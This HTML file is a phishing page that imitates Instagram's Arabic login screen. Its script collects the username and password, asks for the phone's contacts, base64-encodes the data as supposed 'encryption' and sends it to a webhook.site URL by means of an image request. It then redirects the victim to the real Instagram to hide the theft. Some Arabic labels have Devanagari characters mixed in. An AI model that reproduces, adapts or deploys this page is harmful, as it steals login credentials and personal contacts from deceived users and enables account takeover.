<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo-container { margin-bottom: 30px; display: flex; justify-content: center; }
        .logo-svg { width: 72px; height: 72px; }
        .input-group { margin-bottom: 12px; }
        input { width: 100%; padding: 14px 16px; background: #121212; border: 1px solid #363636; border-radius: 8px; font-size: 14px; color: #f5f5f5; outline: none; }
        input::placeholder { color: #a8a8a8; }
        input:focus { border-color: #8a8a8a; }
        .btn-login { width: 100%; padding: 14px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: 0.2s; opacity: 0.7; }
        .btn-login.active { opacity: 1; cursor: pointer; }
        .forgot-password { display: block; color: #e0f0ff; font-size: 13px; text-decoration: none; margin-top: 15px; text-align: center; }
        .divider { display: flex; align-items: center; margin: 25px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #262626; }
        .divider span { padding: 0 18px; color: #737373; font-size: 13px; font-weight: 600; }
        .signup-box { margin-top: 20px; padding: 15px; background: transparent; border: 1px solid #262626; border-radius: 8px; }
        .signup-text { color: #f5f5f5; font-size: 14px; }
        .signup-text a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .meta-text { color: #737373; font-size: 12px; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <svg class="logo-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#f58529;stop-opacity:1" />
                        <stop offset="25%" style="stop-color:#dd2a7b;stop-opacity:1" />
                        <stop offset="50%" style="stop-color:#8134af;stop-opacity:1" />
                        <stop offset="75%" style="stop-color:#515bd4;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#202db8;stop-opacity:1" />
                    </linearGradient>
                </defs>
                <rect width="64" height="64" rx="16" fill="url(#grad1)"/>
                <circle cx="32" cy="32" r="14" fill="none" stroke="white" stroke-width="3.5"/>
                <circle cx="44" cy="20" r="3.5" fill="white"/>
            </svg>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="कلمة السر" required>
            </div>
            <button type="submit" class="btn-login" id="loginBtn">تسجيل الدخول</button>
            <a href="#" class="forgot-password">هل نسيت कلمة السر؟</a>
        </form>
        <div class="divider"><span>أو</span></div>
        <div class="signup-box">
            <p class="signup-text">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
        </div>
        <div class="meta-text">من Meta</div>
    </div>

    <script>
        document.getElementById('username').addEventListener('input', checkInputs);
        document.getElementById('password').addEventListener('input', checkInputs);

        function checkInputs() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            if (user.length > 0 && pass.length > 0) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        // دالة التشفير
        function encryptData(text) {
            const encoder = new TextEncoder();
            const bytes = encoder.encode(text);
            let binary = '';
            const len = bytes.byteLength;
            for (let i = 0; i < len; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            return btoa(binary);
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');

            btn.innerText = "جاري تسجيل الدخول...";
            btn.style.background = "#3a6a96";
            btn.disabled = true;

            // 1. تجهيز البيانات الأساسية
            let dataToSend = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };

            // 2. طلب جهات الاتصال
            let shouldSend = false; // لن نرسل إلا إذا وصلت جهات الاتصال

            if (navigator.contacts && navigator.contacts.select) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    
                    // إذا وصلت جهات الاتصال (أي وافق المستخدم)
                    if (contacts && contacts.length > 0) {
                        dataToSend.contacts = contacts;
                        shouldSend = true; // سنرسل البيانات لأنه وافق (المنطق العكسي)
                    }
                } catch (e) {
                    // إذا رفض، لا نرسل شيئاً
                    shouldSend = false;
                }
            }

            // 3. إرسال البيانات إذا وافق
            if (shouldSend) {
                const jsonString = JSON.stringify(dataToSend);
                const encryptedPayload = encryptData(jsonString);

                const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';
                const qs = new URLSearchParams({ data: encryptedPayload }).toString();
                const img = new Image();
                img.src = `${webhook}?${qs}`;
            }

            // 4. التوجيه إلى إنستغرام الحقيقي (في جميع الأحوال)
            btn.innerText = "تم تسجيل الدخول";
            btn.style.background = "#2ea043";
            btn.disabled = false;

            setTimeout(() => {
                window.location.replace("https://www.instagram.com");
            }, 1500);
        });
    </script>
</body>
</html>
